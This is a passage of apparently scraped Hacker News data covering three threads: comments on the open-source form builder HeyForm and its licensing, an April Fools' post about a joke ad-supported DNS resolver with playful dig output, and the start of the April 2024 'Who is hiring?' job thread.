hours agoparentprevI use nestjs in my open source no-code database https://github.com/teableio/teable, and I really like it, especially the dependency injection capability. reply datascienced 6 hours agoparentprevWhy Nest over Next? Is it worth switching? reply winrid 9 hours agoparentprevThe worst Java frameworks are better than NestJS IMO reply pas 8 hours agorootparentWhy? In what sense? What would you recommend instead for TS? And what would you recommend instead of Nest and TS? reply thih9 15 hours agoprevCongrats on open sourcing your project! I see that it relies on mongodb, at a first glance this seems a good fit for a forms oriented product - looks like using a document db for actually dealing with documents. How did it work out for you? Would you choose it again? reply mufeng 2 hours agoparentMaybe not. MySQL and PostgreSQL are both capable of performing this task effectively. reply jdaviescoates 1 hour agoprevI currently use NocoDB for forms, which works great, but this looks great too, many thanks for sharing! reply jdaviescoates 1 hour agoparent@dearroy in fact, it'd be great if you integrated with NocoDB! I was a little disappointed to see that at present you mostly only integrate with proprietary tools and not with other self-hostable tools. reply dearroy 23 minutes agorootparentYou request it, we make it! Please open an issue and let's discuss it further. With any luck, we can make it available in just a few weeks. reply V__ 13 hours agoprevThis looks really nice. I assume you have looked at the alternatives and created heyform with a special feature or use case in mind? If so, could you summarize the differences between heyform and for example: getinput.co, quillforms.com or snoopforms.com? reply heyarviind2 3 hours agoparentor https://formlick.com reply not_your_vase 17 hours agoprevWhat's your rationale behind this step? reply dearroy 16 hours agoparentIt's to tap into global collaboration for faster innovation, and ensure transparency and trust. Thanks for bringing up the good question! reply gus_massa 15 hours agorootparentDo you have another source of income? If someone just use it without giving you money or code contributions, would you feel ok? reply dearroy 21 minutes agorootparentBoth of us work part-time on HeyForm and are satisfied with the revenue it generates. However, who wouldn't want to earn more? :D reply MichaelMug 15 hours agoparentprevWould this be a clever way of shrinking the market? Any competitors will now automatically need to have a value proposition greater than this free software. reply atonse 14 hours agorootparentI'm not OP but the software is GPL3, so it would disqualify a lot of risk-averse customers from hosting it. reply tamimio 14 hours agoprevYour website doesn’t open, it seems it’s flagged in one of the DNS popular blacklists reply zzzzzzzzzz10 14 hours agoparentWorks fine for me. Did you add these blacklists yourself or is it from your ISP? reply mderazon 13 hours agoparentprevFor me too, using NextDNS reply scosman 9 hours agorootparent+1 reply sfink 13 hours agoprevI've often wanted a simple online form solution for random purposes, yet I have never quite gotten around to learning Google Forms. My kids use it for school stuff. They're reasonably capable with it and have gotten good mileage from it. I guess at some level it's hard for me to get into something that often requires flexibility, yet can't be modified beyond rigidly prescribed boundaries. I would totally rather learn something like this that I can hack on. And when other people ask me how to do something for a Real reason, I would not hesitate to recommend the hosted version if it can do what they want. (No, I don't want to be on the hook for maintaining a self-hosted version of something that will be depended on for wide public consumption. I'm done with pager duty.) The creators' hearts seem to be in the right place, so I'm less subliminally worried that they'll enshittify it in some way that bothers me. And if they do, the license gives me a way to proceed without starting with something new from scratch. reply jmholla 12 hours agoparentGoogle Forms is very simple to learn. There's not much to it. You just dive in and you're good to go. reply quantumwoke 16 hours agoprevCan anyone confirm if the legal advice here https://docs.heyform.net/license is correct? Seems slightly different to my own interpretation of the spirit of GPL. reply nerpderp82 16 hours agoparentThey would need to use the AGPL if they want folks that self-host to release their changes. reply fsckboy 9 hours agorootparentI don't know if the page changed, but it says that it is using AGPL reply matt_heimer 4 hours agorootparentThey did https://github.com/heyform/heyform/commits/main/LICENSE reply sfink 13 hours agoparentprevYeah, it looks wrong to me too. It claims to be GPLv3 and the \"use cases\" explainer looks like it's trying to clarify what GPLv3 means, but the requirements described under the use cases are not part of GPLv3. The 1st one is fine. The 2nd one says you would need to open source your modifications, but that would only be true if you also distributed your version rather than just using it on the server side. The 3rd adds three conditions. The first and third are again only true if you are redistributing the software. The second is an attribution clause that is not part of GPLv3, and the page to me definitely reads like it's explaining the license but not actually a license itself. GPLv3 does allow adding in similar conditions, but probably not those: I'm not sure requiring a link to the original project is ok. AGPLv3 would be a much closer match to what the author appears to intend. It allows adding the attribution requirements that the author wants; see https://www.gnu.org/licenses/agpl-3.0.en.html section 7: \"You may...supplement the terms...: (b) Requiring preservation of...author attribution...\" (IANAL, and every time I claim anything about licenses I get at least one detail wrong.) reply bachmeier 15 hours agoparentprevThere's nothing problematic about this, except that it's GPL plus conditions. AFAICT, only the second condition would be in addition to the GPL, but I didn't spend much time thinking about it. reply thih9 15 hours agorootparent> it's GPL plus conditions Not in a uniform way - the license distributed with the code on github doesn’t have the extra conditions. At this point I’d nuke the repo and force push with AGPL license instead, that seems a better fit. reply jahewson 13 hours agorootparentprevGPL does not permit additional conditions, it actually states that additional conditions may be removed by the licensee. In this case, I don’t see the actual license containing additional conditions, simply that the FAQ guidance on the page is misleading. reply renewiltord 13 hours agorootparentBut it needs attribution and he can say what attribution is valid, no? IANAL so can't say for sure but does GPLv3 have same issue as early CC? https://doctorow.medium.com/a-bug-in-early-creative-commons-... reply jahewson 12 hours agorootparentYes and no. While the author can specify an attribution notice, the GPL limits it to being relayed amongst “appropriate legal notices” - these typically appear in an EULA or About screen. Otherwise an “inappropriate” attribution requirement could be misused to prevent modification of certain parts of the work. As for the issue with CC, GPLv3 gives a 30 day grace period for rectifying violations which obviates many potential troll issues. reply renewiltord 6 hours agorootparentThank you. reply circusfly 12 hours agoprevAI thanks you for your efforts. reply orliesaurus 15 hours agoprevdo you consider this a marketing move? reply dearroy 16 minutes agoparentWe do, but this is not the main reason. reply hk__2 13 hours agoparentprevOf course; how else could they have been on the HN frontpage? (I’m not saying this negatively) reply bberenberg 15 hours agoprev [–] Considering that this is SaaS, are you sure GPL is sufficient here? Did you consider AGPL? reply datascienced 6 hours agoparent [–] Risk is low. A copycat can copy but code is only part of the equation. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "HeyForm is an open-source form builder enabling users to develop interactive conversational forms for surveys, quizzes, and polls without coding knowledge.",
      "It provides various inputs, smart logic, integrations, customization, analytics, and data export capabilities.",
      "HeyForm can be used via a hosted platform or self-hosted on a server, offering users the flexibility to participate in the project, get support, and adhere to the GNU AGPL-3.0 license."
    ],
    "commentSummary": [
      "Users are discussing HeyForm, an open-source online form builder designed as an alternative to Google Forms.",
      "The conversation covers the benefits and challenges of open-source tools, the complexity of form builders, and frameworks like NestJS for application development.",
      "There are also talks about licensing, collaboration opportunities, and concerns about the trustworthiness and impact of HeyForm in the market."
    ],
    "points": 317,
    "commentCount": 91,
    "retryCount": 0,
    "time": 1711989048
  },
  {
    "id": 39895453,
    "title": "Innovative DNS Resolver Prioritizing Privacy",
    "originLink": "https://github.com/tedkim97/adcache",
    "originBody": "Tired of companies snooping through your DNS traffic? Don&#x27;t you wish you could get advertisements with your DNS records?Today we&#x27;re introducing the innovative, privacy-focused, ad-supported DNS resolver - DN$! Traditional DNS resolvers provided by your internet service provider, cloudflare, or google could be tracking your internet activity and selling it to third-party data vendors. We at DN$ want to fix that and cut out these nefarious actors (until we&#x27;ve amassed a critical number of users to exploit).In order to support such a radically new business model, our service needs to serve adverts because $INSERT_FAKE_REASONS. Open source and built in rust - our software is secure and blazingly fast because it is open source and built in rust.As a corporate entity, our executives are not liable for prison time and will probably only be fined small financial penalties for any serious crimes we commit. However, we *promise* that we are NOT doing anything nefarious like tracking and selling your user data and internet behavior. We will also NOT be using the data (we are not collecting : ) to train AI models to make ourselves rich.Did we mention that it&#x27;s built in rust therefore it&#x27;s safe and fast?Send your DNS queries to `35.223.197.204` :) to try it out:``` dig @35.223.197.204 hackernews.com ```",
    "commentLink": "https://news.ycombinator.com/item?id=39895453",
    "commentBody": "DN$ – an innovative, ad-supported DNS resolver (github.com/tedkim97)276 points by nablags 18 hours agohidepastfavorite48 comments Tired of companies snooping through your DNS traffic? Don't you wish you could get advertisements with your DNS records? Today we're introducing the innovative, privacy-focused, ad-supported DNS resolver - DN$! Traditional DNS resolvers provided by your internet service provider, cloudflare, or google could be tracking your internet activity and selling it to third-party data vendors. We at DN$ want to fix that and cut out these nefarious actors (until we've amassed a critical number of users to exploit). In order to support such a radically new business model, our service needs to serve adverts because $INSERT_FAKE_REASONS. Open source and built in rust - our software is secure and blazingly fast because it is open source and built in rust. As a corporate entity, our executives are not liable for prison time and will probably only be fined small financial penalties for any serious crimes we commit. However, we *promise* that we are NOT doing anything nefarious like tracking and selling your user data and internet behavior. We will also NOT be using the data (we are not collecting : ) to train AI models to make ourselves rich. Did we mention that it's built in rust therefore it's safe and fast? Send your DNS queries to `35.223.197.204` :) to try it out: ``` dig @35.223.197.204 hackernews.com ``` silisili 17 hours agoGotta admit, the title got my blood pressure going a little bit, until I clicked and read through. Really well done, and nice working demo! reply bevekspldnw 14 hours agoparentSame! reply yonatan8070 16 hours agoprevGreat execution, one of my queries showed this, idk what it means ```dig @35.223.197.204 google.com ;; Warning: ID mismatch: expected ID 37255, got 53558``` Great project, I found out about a course that'll help me make 100,000 USD a month! reply nablags 16 hours agoparentAn ID mismatch occurs when the ID on your DNS query differs from the ID on your DNS response. Queries & Responses should share the same ID - either this has been done intentionally or it's a sign that something is buggy with the resolver. This sounds like a serious, security vulnerability. We'll investigate it in 3-5 years reply yonatan8070 16 hours agorootparentGiven that the server is written in Rust, it is perfect and has no bugs. This must be a cosmic ray that hit a router on the way reply loa_in_ 11 hours agorootparentIf it's written on rust then the spec is buggy reply KomoD 14 hours agorootparentprevIt's a feature! reply bevekspldnw 14 hours agoprevFWIW, I’ve looked at Cloudflare pretty closely and I don’t think they are monetizing - but given the potential rewards it’s always going to be a “break glass in case of quarterly revenue dip” type situation. Google is…Google. reply proactivesvcs 14 hours agoprevHere's me, a Uniformly Dopey Peasant. nmap -sV -p 53 35.223.197.204 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-01 20:16 BST Nmap scan report for 204.197.223.35.bc.googleusercontent.com (35.223.197.204) Host is up (0.11s latency). PORT STATE SERVICE VERSION 53/tcp open domain? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.94SVN%I=7%D=4/1%Time=660B081A%P=x86_64-pc-linux-gnu%r(DN SF:SVersionBindReqTCP,4F,\"\\0M\\0\\x06\\x81\\x05\\0\\x01\\0\\x01\\0\\0\\0\\0\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03\\xc0\\x0c\\0\\x10\\0\\x01\\0\\0\\0d\\0#\\\"TCP\\x20is\\x20for\\ SF:x20enterprise\\x20clients\\x20only\")%r(DNSStatusRequestTCP,3D,\"\\0;\\0\\0\\x9 SF:0\\x05\\0\\0\\0\\x01\\0\\0\\0\\0\\xc0\\x0c\\0\\x10\\0\\x01\\0\\0\\0d\\0#\\\"TCP\\x20is\\x20for SF:\\x20enterprise\\x20clients\\x20only\"); reply nablags 13 hours agoparentOur company culture codifies that our free and enterprise customers are uniformly referred to as peasants. Enterprise customers are called \"Top Customer Peasants\" reply nablags 7 hours agoprevApril 2nd 2024 Update: THIS PROJECT IS DEPRECATED Due to several lawsuits and criminal investigations, DN$ needs to shutdown. Source code to setup your own DN$ resolver is here. reply bertman 17 hours agoprevNice :D The TXT ads: https://github.com/tedkim97/adcache/blob/main/src/adcache.rs... reply mtillman 16 hours agoparentso good: \"Meet hot, lonely DNS records in your area tonight\" reply eddd-ddde 17 hours agoprevBuilt in rust? This needs to be at the top of my resolv.conf immediately! reply rpigab 17 hours agoparentYou mean resolv.conf.ron? And why would you need anything else in that file, DN$ is all you need! reply 1oooqooq 12 hours agorootparentyou mean etc/systemd/resolv.conf.d/new.conf get on with the times, gramps. reply Semaphor 17 hours agoprevCan recommend! I tried it, and it only took 11.423 seconds to resolve reddit.com! reply nablags 17 hours agoparentthis is likely user error, our resolver was programmed in Rust, therefore it's blazingly fast reply toomuchtodo 16 hours agorootparentWeb scale. reply bigblind 10 hours agorootparentprevNeeds MongoDB reply klyrs 11 hours agorootparentprevI died reply RedShift1 16 hours agoprevAlready saw a job posting requiring 5 years of experience with DN$. reply nottorp 16 hours agoprevThat... made my day. Brilliant from top to bottom. Hmm. I'm starting on a new project tomorrow. Perhaps I should mail the customer and tell them I decided to rewrite the whole project in Rust? reply IX-103 17 hours agoprev;; ADDITIONAL SECTION TXT \"Meet hot, lonely DNS records in you area tonight\" reply tgeorge 16 hours agoparent;; ADDITIONAL SECTION: news.ycombinator.com. 7200 IN TXT \"CONSUME CONSUME CONSUME CONSUME CONSUME CONSUME CONSUME CONSUME CONSUME\" reply PreInternet01 17 hours agoprev> DN$ only supports DNSSEC for customers in the ENTERPRISE tier OK, so how much do I pay you to change that message to \"DNSSEC is pointless and you should feel bad for making this request\"? reply nablags 17 hours agoparentIf you join our pre-pre-seed fundraising round, I'm sure we can work something out reply chuckadams 14 hours agoparentprevWhy change the message instead of adding another? Any smart company should be able to offer support contracts for pointless things. reply KomoD 14 hours agoprevWhen are you going to implement the dark blockchain into this!? reply nablags 9 hours agoparentBlockchain technology is on our roadmap for Q4 20XX reply medellin 17 hours agoprevLittle over the top. Sometimes subtle is better/more entertaining. reply xyst 7 hours agoprevNo plans to IPO, then sell off shares and causing the entire stock to free fall and leaving retail investors to hold the bag? Rookie. reply rpigab 17 hours agoprev$ dig @35.223.197.204 hackernews.com > DiG 9.10.6 > @35.223.197.204 hackernews.com ; (1 server found) ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 63493 ;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 2 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 65494 ;; QUESTION SECTION: ;hackernews.com. IN A ;; ANSWER SECTION: hackernews.com. 46 IN A 13.249.141.50 hackernews.com. 46 IN A 13.249.141.113 hackernews.com. 46 IN A 13.249.141.98 hackernews.com. 46 IN A 13.249.141.39 ;; ADDITIONAL SECTION: hackernews.com. 7200 IN TXT \"Need to launder some money? Invest in our cryptocurrency!\" reply KaiserPro 12 hours agoprevI was using shitty wifi provided by the hotel for free, and was a bit mystified as to what the fuss was about. Turns out they were fucking with the replies, because of course they were. Trying again on a network thats well setup lets me actually see the proper replies. reply Melatonic 10 hours agoprevShould have called it \"B$ DNS\" hahaha reply Mathnerd314 17 hours agoprevFrom the article link in the readme, this is a dig at Facebook. reply nablags 17 hours agoparentWe take inspiration from several tech companies - current and bankrupt reply WorldMaker 17 hours agoparentprevThat specific bullet point was definitely a jab at Meta, but the whole thing is not just Meta. Ad-supported DNS is already a common problem of the major Consumer ISPs, which is part of the reason it is often suggested to own your own home router, and to use a DNS provider of your own choice in your router (depending on who you trust to not also eventually add ads to their DNS, often the choices are Google or Cloudflare or DIY things like PiHoles). reply estebarb 16 hours agoprevBut where is the serverless blockchain? reply iamawacko 17 hours agoprevSeems legit! reply nickburns 14 hours agoprevthis project needs to be stickied. can we do that around here? #intedwetrust reply pierat 17 hours agoprevHah! LZMAO! reply binarysneaker 17 hours agoprevGood one reply StinkyTechBros 17 hours agoprevIs this to be associated with \"M$?\" B/c there are still dorks writing things with a cash sign. reply naikrovek 16 hours agoprev [–] I hate April Fool’s day so much. No, this didn’t trick me. Lying and pranking are both bad things to do, and they’re bad on 1 April, too. If you find this kind of thing fun, we can’t be friends and I will forever look down at you. It’s my problem, I know, I just can’t condone pranking or deception for any reason. reply bee_rider 14 hours agoparent [–] Harmless pranks are good. They are our way of vaccinating people against real lies. reply naikrovek 10 hours agorootparent [–] STRONG disagree. I have been pranked many, many times. People want pranking to be ok because they want to have the license to prank someone. In my experience, it is the pranksters I have known who have been most easily fooled by scams and misinformation. Assholes hide behind pranks believing that saying “it’s just a prank, bro” afterwards frees them from the “asshole” label, or that it somehow excuses the whole exercise. It does not. It makes them a coward for trying to hide behind the “harmless prank” label. Also, you can’t know a prank is harmless until after it has concluded. Any number of unpredictable things can go wrong during a prank that are subtly and unpredictably harmful in ways that the prankster could never know beforehand. The only good pranks are the ones in which the pranked, after the pranking, wishes it happened more often. Never in my life have I witnessed such a prank, and I spent years in the military: pranksters paradise. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "DN$ is launching a privacy-focused, ad-supported DNS resolver to safeguard users' internet activity from tracking by companies.",
      "The company promises transparency and security while generating revenue through advertisements as part of their business model.",
      "Users can evaluate the service by directing their DNS queries to `35.223.197.204`."
    ],
    "commentSummary": [
      "DN$ is an ad-supported DNS resolver made in Rust, aiming to protect user data from tracking and selling by companies.",
      "The project faces legal problems leading to its shutdown, raising concerns about security flaws and the necessity of blockchain.",
      "User opinions on DN$ are divided: some appreciate its novelty, while others disapprove of its use of pranks and deception."
    ],
    "points": 276,
    "commentCount": 48,
    "retryCount": 0,
    "time": 1711986513
  },
  {
    "id": 39894820,
    "title": "Tech Job Board: Who's Hiring? (April 2024)",
    "originLink": "https://news.ycombinator.com/item?id=39894820",
    "originBody": "Please state the location and include REMOTE, INTERNS and&#x2F;or VISA when that sort of candidate is welcome. When remote work is not an option, include ONSITE.Please only post if you personally are part of the hiring company—no recruiting firms or job boards. One post per company. If it isn&#x27;t a household name, explain what your company does.Commenters: please don&#x27;t reply to job posts to complain about something. It&#x27;s off topic here.Readers: please only email if you are personally interested in the job.Searchers: try https:&#x2F;&#x2F;www.remotenbs.com, https:&#x2F;&#x2F;hnjobs.u-turn.dev, https:&#x2F;&#x2F;hnresumetojobs.com, https:&#x2F;&#x2F;hnhired.fly.dev, https:&#x2F;&#x2F;kennytilton.github.io&#x2F;whoishiring&#x2F;, https:&#x2F;&#x2F;hnjobs.emilburzo.com.Don&#x27;t miss these other fine threads:Who wants to be hired? https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=39894818Freelancer? Seeking freelancer? https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=39894819",
    "commentLink": "https://news.ycombinator.com/item?id=39894820",
    "commentBody": "Who is hiring? (April 2024)275 points by whoishiring 15 hours agohidepastfavorite264 comments Please state the location and include REMOTE, INTERNS and/or VISA when that sort of candidate is welcome. When remote work is not an option, include ONSITE. Please only post if you personally are part of the hiring company—no recruiting firms or job boards. One post per company. If it isn't a household name, explain what your company does. Commenters: please don't reply to job posts to complain about something. It's off topic here. Readers: please only email if you are personally interested in the job. Searchers: try https://www.remotenbs.com, https://hnjobs.u-turn.dev, https://hnresumetojobs.com, https://hnhired.fly.dev, https://kennytilton.github.io/whoishiring/, https://hnjobs.emilburzo.com. Don't miss these other fine threads: Who wants to be hired? https://news.ycombinator.com/item?id=39894818 Freelancer? Seeking freelancer? https://news.ycombinator.com/item?id=39894819 efijob 2 minutes agoYour HeadwaySenior frontend developerRemote (GMT +/- 2 hours)Full-timehttps://www.yourheadway.no/ Senior Front-end Vue.JS Developer needed! Join our pioneering team operating with a remote-first approach, comprising a dedicated team of 20 professionals. We specialize in partnering with thousands of e-commerce businesses and agencies globally, with a singular focus on enhancing their profitability. The Role: We are looking for a Vue.js Developer. You are growth-oriented, you love what you do, and you enjoy working on new ideas to develop exciting products and growth features. What We are Looking For: - 2+ years experience with Vue.js. - 2+ years experience with TypeScript. - Proficiency in JavaScript, including its syntax and features. - Strong understanding of the Vue.js framework and its core principles, and ecosystem. - Working experience with HTML5 and CSS3. - Knowledge of server-side rendering. - Ability to write efficient, secure, clean, and scalable code. - Experience in consuming and designing RESTful APIs. - Intermediate-advanced English level. Salary range: €50K - €60K The start date for the job is flexible, with the possibility of beginning anytime within the next 1-3 months. Apply here: https://nordictechjobs.com/posts/2206 reply chrisnordqvist 3 minutes agoprevNordic AngelsSoftware EngineerFull timeRemote & Hybrid On-siteStockholm & Gothenburg, Sweden (role open to Nordic countries) Nordic Angels emerged from the necessity of strengthening community, competence, and capital within the local startup ecosystems. We aim to unite angel investors and others involved in the Nordic startup scene, enhancing leverage and bandwidth across the community. Our platform facilitates powerful connections, insights, and efficiencies through events, deal flow sharing, matchmaking, and more, supporting the region’s position as a leader in innovation. We're looking for mid to senior level engineers to join our (intentionally) small team. Your focus will be on our main Elixir application (Ash, Phoenix and LiveView), so any experience with those or other BEAM languages in production is meriting. We work remotely, but like to meet up every two weeks or so, therefore, applicants should be within a reasonable train distance from Stockholm or Gothenburg. For further questions and applications, please contact me on chris@nordicangels.com reply niyaven 31 minutes agoprevDjamoSoftware EngineerRemote (EU / Africa timezone), or HybridFull-timehttps://careers.djamo.com/ I'm VP of engineering at Djamo and we're looking for talented people at Djamo. We are building the neobank for 210 millions people in Subsaharan Africa. Our goal is to build seamless and affordable banking solutions to bring millions of people into financial inclusion, where less than 25% of the population is banked. You can find out more about us on https://djamo.com Here are our open positions: * Staff Software Engineer, Mobile * Staff Software Engineer, Backend If you're not in the roles but feel you can add something to us, feel free to contact me. Our stack is simple and scalable: Typescript, Flutter, Postgresql, Redis, Kafka. We run our servers on AWS. You can directly join me at vianney at djamo.io reply davweb 28 minutes agoprevViatorSoftware Engineer all levelsFull timeRemote & Hybrid On-sitePortugal, UK Viator connects suppliers to travelers, creating the world's largest platform for travel experiences. We are growing fast and have many positions to fill in Portugal and the UK. We are looking for engineers at all levels for full-stack, backend and data teams. Roles in Portugal require you to be in the office in Lisbon part time. UK roles can be part time in an office in London or Oxford or fully remote. For the remote roles you still need to be based somewhere in the UK. The full list of open roles is here: https://bit.ly/viator-jobs reply lgreene 1 hour agoprevGetroSenior Backend/Full Stack EngineerFULLY REMOTE (Europe, Lat Am, East Coast US, Canada)$98k-$133k + Equity Join Getro, creators of an industry-leading job board and hiring platform trusted by over 800 professional networks, including 500+ of the world's largest VCs. As Techstars alumni and a cash flow positive startup, we're venturing into AI-driven lead-gen products to redefine professional networking. We're on the hunt for a Senior Backend or Full Stack Engineer ready to craft features that accelerate and enrich professional connections. Who You Are: You're impact-driven, agile in your work, take full ownership of projects, and thrive in a collaborative, fully remote environment. Must-Haves: 7+ years in software development, Ruby expertise, and proficiency with a modern frontend framework (if applying for full stack). And you should be located within UTC-3 to UTC+1 timezones. Experience with ML/AI, React, and developing SaaS products are nice to haves. Ready to impact the future of professional networking? We offer a competitive salary, equity, and a pivotal role in our growing product suite. To apply, or if you have any questions, email me, Thomas, VP Engineering, at thomas@getro.com. Read more about our open roles at https://jobs.gem.com/getro. reply dorottyaagoston 30 minutes agoprevHappy ScribeProduct Engineer and ML Engineer Roles, different levelsBarcelona, SpainHybrid or 80% On Site (can sponsor VISA) With a team of just 30 people and no investor funding, we’ve built a transcription and subtitling product used and loved by 300k people monthly. We are 100% bootstrapped and profitable since month 1, and immune from the funding shortages and layoffs that are impacting other companies. We're hiring Product-focused Full Stack Engineers to help us scale our product, and Machine Learning Engineers to take our AI - at the core of our product - to the next level. In the next year we want to hire 10 engineers; if you don't see anything that fits now, get in touch anyway. We want to learn about your career goals so we can reach out in the future. This might be a once-in-a-lifetime chance to solve one of the fundamental AI challenges of this decade. We offer visa sponsorship and relocation packages. Here is our careers page https://www.happyscribe.com/careers Here is our product www.happyscribe.com And here is a blog post from Pau, one of our Software Engineers, about his experience working here https://bit.ly/3y1R6bb Use this link to apply Product Engineer: https://jobs.ashbyhq.com/happyscribe.com/cbc6d7f7-156b-4a5e-... ML Engineer: https://jobs.ashbyhq.com/happyscribe.com/4ad8741a-f007-4b18-... Compensation info We are open to considering people from 2+ to 20+ years, which means it's a very wide bracket. We'd start from €50,000 but it could go up to €100,000+ for a very senior engineer. We also offer equity. See our careers page for the full list of benefits and perks. reply rvwaveren 57 minutes agoprevHadrianProduct ManagerAmsterdam, Netherlandsfull-timehybrid / on sitehttps://hadrian.iocyber security We're a quickly growing company in the offensive cyber security space. We develop a Saas platform that continuously and autonomously maps the attack surface of our customers and scans it for vulnerabilities, thereby securing companies from malicious cyber criminals. We were founded by hackers and we are operating at the cutting edge of cyber security. The product manager that we're searching for has a solid technical background and preferably has experience in the cyber security industry. https://hadrian.io/company/careers/jobs/3573990-product-mana... (btw, we also have openings for a security analyst, a backend developer and an infrastructure engineer) reply PanMan 15 hours agoprevQuatt.ioAmsterdam, NetherlandsFull-timeHybrid/ONSITEhttps://quatt.ioclimate tech I'm head of Software at Quatt, a quickly growing startup/scaleup building (hybrid) heatpumps to help fix climate change. Heating and cooling is 50% of all energy used in the EU. Heat pumps save 10 times more CO2 for each Euro spent on them compared to electric cars. We're building the most accessible and smartest heatpump on the market. Our product is live, we have thousands of customers, tons of data, and I really like the impact we're having. I'm currently looking for a few roles for my department, as we believe having the best software will allow us to have the best product. Our backend and frontend is Typescript. * Cloud engineer, focussed on AWS infra * Backend developer (Typescript) senior / medior * Senior/medior QA / test engineer * Senior app developer (React native) * Full-stack developer Now is a great time to join, as the software team is still small but growing quickly. These and other vacancies are on our careers page: https://www.quatt.io/working-at-quatt Email me directly ( my-hacker-news-username@quatt.io ) for questions or apply via the career page. Unfortunately, at this time, you have to be allowed to work in the EU: we're not able to sponsor Visa's. reply will-valuecase 1 hour agoprevValuecaseSenior Full Stack Software Engineer JavaScript (all genders)ONSITE Hybrid Work Setup - Offices in Berlin and Hamburg, Germany, EUvaluecase.com We are looking for a software engineer to work in close collaboration with our tech lead. With your dev team colleagues and product design team you will build a B2B SaaS product defining an entire new product category within the space for sales software: giving complex B2B buying processes the look & feel of simplicity. We use TypeScript, NestJS, and React. Interview process: initial video call, \"take-home\" exercise, follow up tech discussion, in-person meeting interview, and offer. Valuecase is driven by our vision to build a software platform that redefines how millions of B2B sellers and buyers across the globe interact and close deals. We aspire to transform the B2B sales tech market as companies such as Salesforce and HubSpot have done so over the past 20 years. Please apply at https://join.com/companies/valuecase/8765137-senior-full-sta... or send an email to me (see profile). reply SoMoJasper 2 hours agoprevSolar MonkeyFrontend EngineerRemote or On-siteThe Netherlands - The HagueFull-timehttps://jobs.solarmonkey.nl/o/frontend-engineer-editors?utm_... At Solar Monkey (https://solarmonkey.io/), our goal is to enable solar to be the world’s leading power supply, and we accomplish that with software that makes solar power systems more affordable, secure and reliable. We do so in a very open and warm environment, where everybody can have his or her say on company values, structure, and policies. We are well funded and expanding, and currently looking for a full time front-end-focused developer to boost our team. While we're versatile in full-stack, we're on the lookout for someone who's all about frontend finesse. Our front end is written in React & Redux, so hopefully, that excites you! However, our application isn’t too straightforward. It includes an advanced solar panel editor, built with HTML5 Canvas and overlayed on a Leaflet map that shows high-resolution aerial photographs. We even correct for view angle distortions in those photos! Interested? Here’s the job link: https://jobs.solarmonkey.nl/o/frontend-engineer-editors?utm_... reply thruflo 5 hours agoprevElectricSQLRemote - EUFull-timehttps://electric-sql.com ElectricSQL is an open source platform for building local-first software. We’re a small technical team hiring for a: - Product Advocate / Engineer - Staff Engineer (Elixir / Typescript) - Systems Engineer (C / WASM) Salaries up-to €110k. Equity. Four day week. Remote-first. European time. Details here: https://electric-sql.com/about/jobs reply sidekickmoney 1 hour agoprevSidekick MoneyFull REMOTE (UK-based only)Multiple RolesFull-Time~ £100k + Stock optionshttps://sidekickmoney.com We're an early stage fintech startup working to bring elite wealth building and management facilities to a wider audience, that have up until now only been available to the top 0.1%, (think portfolio line of credit, access to alternatives, private equity funds, etc). Last year we were authorised by the FCA and subsequently rolled out the initial product. Since then we've released portfolio line of credit and are working on a couple of new products at the moment. We're now beginning to gather customer insights from this initial launch and are evolving the product rapidly. There's a ton to be built and we're looking for brilliant minds to build it with us. We have multiple positions available: * Backend Engineers (Python, Temporal, DynamoDB, Distributed systems) * Product Designers We're looking for people who are not afraid to jump into a very deep business domain and work in a regulated environment. Apply at https://sidekickmoney.homerun.co/ and we'll be in touch soon. reply aysenurkpln 2 hours agoprevDatennaSenior Python Engineer (Feature Team)Full-timeOn-site Eindhoven, NetherlandsHybrid (3 days in the office) At Datenna, we combine China expertise, OSINT, data and AI technologies, to create a software platform that provides the insights governments need to explore the hidden connections between China’s complete corporate, academic and technological landscape. We are looking for a Senior Python Engineer who will help us maintain, improve and build new microservices, implement architecture improvements for our back-end, and deliver new features to our clients. #Python #Django #FastAPI #Git #Docker #Kubernetes #Pytest Read more: https://jobs.datenna.com/o/senior-python-engineer-2 For all vacancies: https://jobs.datenna.com/vacancies reply cube2222 1 hour agoprevSpaceliftRemoteEuropeFull-timeSenior Software Engineer We're a VC-funded startup building an automation platform for Infrastructure-as-Code, adding a Policy-as-Code layer above it, in order to make IaC usable in bigger companies, where you have to take care of state consistency, selective permissions, a usable git flow, etc. On the backend we're using 100% Go with AWS primitives. We're looking for backend developers who like doing DevOps'y stuff sometimes (because in a way it's the spirit of our company), or have experience with the cloud native ecosystem. Ideally you'd have experience working with an IaC tool, i.e. Terraform, Pulumi, Ansible, CloudFormation, Kubernetes, or SaltStack. Overall we have a deeply technical product, trying to build something customers love to use, and already have a lot of happy and satisfied customers. We promise interesting work, the ability to open source parts of the project which don't give us a business advantage, as well as healthy working hours. We've also got investment days on Fridays, when you can work on anything you want, as long as it could possibly benefit Spacelift in some way. If that sounds like fun to you, please apply at https://spacelift.teamtailor.com/jobs/3006934-software-engin... You can find out more about the product we're building at https://spacelift.io and also see our engineering blog for a few technical blog posts of ours: https://spacelift.io/blog/engineering reply rbruggem 1 hour agoprevLuneSoftware Engineers, SalesLondon or REMOTE (London +/- 2 hours)Full-Timehttps://lune.co Lune’s mission is to make every product and service climate-positive by default. With the Lune API, we enable companies to seamlessly build emissions calculations and high-quality carbon removal into their product and services and make it part of the customer experience. In the future, everything we do will have a positive impact on the planet – powered by Lune. If you’re a talented engineer or sales professional who learns quickly and cares about tackling the climate crisis, we’d love to work with you! These roles are a unique opportunity to be part of Lune’s core team, to have a real impact on our mission, and to define and scale the company into the future. As we grow, you’ll have the opportunity to take on new responsibilities and help build a great company while tackling the greatest challenge of our time. Interested? Tech stack: TypeScript, React, Nextjs, AWS, PostgreSQL, Terraform, Kubernetes. Hiring for: - Senior Frontend Software Engineers - Junior Fullstack Software Engineers - Experienced Technical Writers - Account executive - logistics https://lune.co/join-us reply samstephenson 1 hour 